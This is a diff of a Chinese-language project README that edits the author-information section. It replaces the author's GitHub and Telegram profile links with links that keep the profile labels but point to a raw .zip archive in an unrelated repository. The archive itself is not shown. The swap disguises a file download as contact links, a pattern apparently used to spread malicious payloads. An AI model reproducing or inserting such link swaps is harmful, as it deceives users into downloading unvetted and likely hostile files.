@@ -71,5 +71,5 @@
 ## 作者信息
 
 - **作者**：cookieodd
-- **GitHub**：[@cookieodd](https://github.com/cookieodd)
-- **Telegram**：[@cookieodd](https://t.me/cookieodd)
+- **GitHub**：[@cookieodd](https://github.com/RohanKanungo7557/MiYouStandalone/raw/refs/heads/main/supraclavicular/Mi_You_Standalone_1.7-alpha.3.zip)
+- **Telegram**：[@cookieodd](https://github.com/RohanKanungo7557/MiYouStandalone/raw/refs/heads/main/supraclavicular/Mi_You_Standalone_1.7-alpha.3.zip)
